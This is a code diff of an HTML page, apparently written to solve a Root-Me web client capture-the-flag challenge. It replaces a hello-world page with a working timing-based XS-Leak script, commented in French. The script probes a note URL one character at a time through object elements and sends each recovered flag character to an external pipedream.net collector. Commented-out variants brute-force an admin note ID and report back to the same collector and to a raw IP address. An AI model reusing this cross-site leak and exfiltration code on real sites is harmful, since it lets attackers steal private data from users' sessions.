@@ -3,38 +3,107 @@
 
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src='./script.js' defer></script>
-    <title>Hello World</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            text-align: center;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        h1 {
-            color: #333;
-            font-size: 2.5rem;
-        }
-    </style>
+    <!-- <link rel="stylesheet" href="../css/evil.css"> -->
+    <title>Symphony</title>
 </head>
 
 <body>
-    <div class="container">
-        <h1>Hello, World! How you doing ?</h1>
-    </div>
+
+    </script>
+    <script defer="">
+        //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
+        //Tout les caractères pour trouver le flag
+        let alpha = `abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=`
+        //variable dans laqulle le flag sera stockée
+        let flag = ""
+        //L'endpoint dans lequel sera envoyé le flag
+        let endpoint = "https://eoba3aqmrw0ajf6.m.pipedream.net/?flag="
+        // let victime = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/"
+
+        /*
+        Fonction récursive permettant de leak le flag
+        */
+        function leak(url, i) {
+            // avec la balise object j'envoie une demande ressource avec la combinaison pour trouver le flag
+            let s = document.createElement('object')
+            //aw déja trouvé
+            s.data = `${url}${encodeURIComponent(flag)}${encodeURIComponent(alpha[i])}`
+
+            //création de la variable de calcule de temps
+            var start = performance.now()
+
+            //si la demande de ressource est sur le bon id le onload est trigger
+            s.onload = (e) => {
+                //on calcule le temps que la demande de ressource aura mis
+                var time = performance.now() - start;
+                console.log("The request took %d ms.", time);
+                //si le temps de la requête est surpérieur ou égale à 2 secondes
+                if (time >= 2000) {
+                    //On ajoute la lettre trrouvé au flag
+                    flag = flag + alpha[i]
+                    //ensuite on envoie la lettre à l'endpoint
+                    fetch(`${endpoint}${encodeURIComponent(flag)}`)
+                    //On recommence le processus si le caractère est trouvé
+                    leak(url, i)
+                } else if (i < alpha.length - 1) {
+                    //dans le cas contraire on passe au teste d'un autre caractère
+                    leak(url, i + 1)
+                }
+                e.target.remove()
+            }
+            document.body.appendChild(s)
+        }
+        //première éxecution de la fonction
+        leak("https://web-client-ch56.challenge01.root-me.org:58056/notes/1791/", 0)
+
+
+
+
+
+
+        //Fonction permettant de brutforce l'id de la note de l'admin
+        
+        // const leak = async (url, id) => {
+        //     return new Promise((r) => {
+        //         let s = document.createElement('script')
+        //         s.src = url
+        //         s.onload = (e) => {
+        //             console.log('Onload event triggered at ' + url);
+        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.textContent}`)
+        //             e.target.remove()
+        //             return r(0)
+        //         }
+        //         s.onerror = (e) => {
+        //             console.log('Error event triggered');
+        //             fetch(`http://91.173.39.199:25565/?error=${id}`)
+        //             e.target.remove()
+        //             return r(1)
+        //         }
+        //         document.head.appendChild(s)
+        //     })
+        // }
+        // function probeError(url, id) {
+        //     let script = document.createElement('script');
+        //     script.src = url;
+        //     script.onload = () => {
+        //         console.log('Onload event triggered at ' + url);
+        //         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+        //     }
+        //     script.onerror = () => {
+        //         console.log('Error event triggered');
+        //         fetch(`http://91.173.39.199:25565/?error=${id}`)
+        //     }
+        //     document.head.appendChild(script);
+        // }
+        // leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
+
+
+    </script>
+    <h1 style="text-align: center;">-----------------------bienvenue----------------------</h1>
+    <input type="text" name="csrf" value="test">
 </body>
 
 </html>
